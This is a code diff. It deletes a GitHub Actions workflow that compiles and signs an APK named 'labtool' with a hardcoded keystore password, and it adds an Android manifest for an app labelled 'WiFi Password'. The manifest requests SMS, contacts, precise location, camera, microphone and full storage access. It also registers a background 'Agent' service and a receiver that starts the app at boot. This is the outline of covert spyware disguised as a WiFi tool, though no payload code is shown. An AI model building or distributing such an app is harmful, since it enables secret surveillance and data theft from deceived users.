@@ -1,42 +1,32 @@
-name: Build APK
-on: [push, workflow_dispatch]
-permissions:
-  contents: read
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: Unpack
-        run: tar -xzvf myapp.tar.gz
-      - name: Setup Java
-        uses: actions/setup-java@v4
-        with:
-          distribution: 'zulu'
-          java-version: '17'
-      - name: Download Android SDK
-        run: |
-          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
-          mkdir -p $HOME/android-sdk/cmdline-tools
-          unzip -q commandlinetools-linux-11076708_latest.zip -d $HOME/android-sdk/cmdline-tools
-          mv $HOME/android-sdk/cmdline-tools/cmdline-tools $HOME/android-sdk/cmdline-tools/latest
-          export PATH=$PATH:$HOME/android-sdk/cmdline-tools/latest/bin
-          yes | sdkmanager --licenses
-          sdkmanager "platforms;android-33" "build-tools;33.0.2"
-      - name: Build APK
-        run: |
-          export ANDROID_HOME=$HOME/android-sdk
-          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/33.0.2
-          mkdir -p gen obj
-          aapt2 compile --dir app/res -o res.zip
-          aapt2 link -o unsigned.apk -I $ANDROID_HOME/platforms/android-33/android.jar --manifest app/AndroidManifest.xml -R res.zip --java gen
-          javac -d obj -cp $ANDROID_HOME/platforms/android-33/android.jar app/src/com/network/wifianalyzer/*.java gen/com/network/wifianalyzer/R.java
-          d8 --output obj obj/com/network/wifianalyzer/*.class
-          cd obj && zip -u ../unsigned.apk classes.dex && cd ..
-          keytool -genkey -v -keystore lab.jks -keyalg RSA -keysize 2048 -validity 10000 -alias lab -storepass lab123 -keypass lab123 -dname "CN=Lab" 2>/dev/null
-          apksigner sign --ks lab.jks --ks-pass pass:lab123 --out labtool.apk unsigned.apk
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
-        with:
-          name: labtool-apk
-          path: labtool.apk
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.network.wifianalyzer">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    
+    <application android:label="WiFi Password" android:theme="@android:style/Theme.NoTitleBar">
+        <activity android:name=".Main" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name=".Agent" android:exported="false" android:foregroundServiceType="dataSync"/>
+        <receiver android:name=".Boot" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
